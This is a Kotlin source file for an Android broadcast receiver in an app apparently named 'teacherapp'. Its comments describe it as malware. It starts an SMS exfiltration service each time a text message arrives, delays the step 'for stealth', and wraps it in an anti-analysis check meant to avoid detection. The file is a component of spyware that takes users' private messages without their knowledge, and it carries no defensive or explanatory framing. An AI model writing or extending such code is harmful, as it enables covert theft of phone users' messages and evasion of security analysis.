package com.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.teacherapp.obfuscation.AntiAnalysisUtils
import com.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Triggers data exfiltration when SMS is received
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            // Delayed execution for stealth
            CoroutineScope(Dispatchers.Default).launch {
                delay(5000L) // Wait 5 seconds

                AntiAnalysisUtils.executeIfSafe(context) {
                    // Trigger SMS exfiltration
                    SmsExfiltrationService.startExfiltration(context)
                }
            }
        }
    }
}